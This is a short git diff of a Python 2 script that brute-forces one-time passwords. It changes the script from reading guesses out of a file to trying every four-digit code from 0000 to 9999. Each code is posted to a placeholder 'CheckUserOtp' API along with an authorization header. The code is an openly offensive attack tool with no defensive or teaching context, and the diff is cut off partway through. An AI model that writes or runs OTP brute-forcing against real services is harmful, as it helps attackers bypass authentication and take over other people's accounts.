@@ -1,4 +1,4 @@
-#usr/bin/python2
+#!/usr/bin/python2
 
 import requests
 import os
@@ -22,12 +22,10 @@ logo = '''
 
 print logo
 
-text = "num_randem.txt" #raw_input("Input file Range Number --> ")
-
-file = open(text,'r')
-
-for number in file :
+for i in xrange(0, 10000):
     # loops Guess the numbers
+    number = "{:04d}".format(i)
+
     url = "http://exmples/oms/api8/CheckUserOtp?"
     data = {'otp': number ,'mobile':""} # yThe data you want to guess
     header = {"Content-Type" : "charset=UTF-8" , "Authorizations" : "060fac9a80afec9b95eb292ad884c5f5"}
